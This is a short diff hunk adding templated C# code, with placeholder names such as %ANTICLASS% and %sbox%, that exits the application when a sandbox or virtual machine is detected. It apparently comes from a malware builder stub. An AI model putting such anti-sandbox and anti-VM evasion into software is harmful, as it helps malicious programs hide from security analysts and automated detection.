@@ -1,0 +1,9 @@
+    if (%ANTICLASS%.%sbox%(Application.StartupPath))
+            {
+                Application.Exit();
+            }
+            
+            if (%ANTICLASS%.%vm__%())
+            {
+                Application.Exit();
+            }
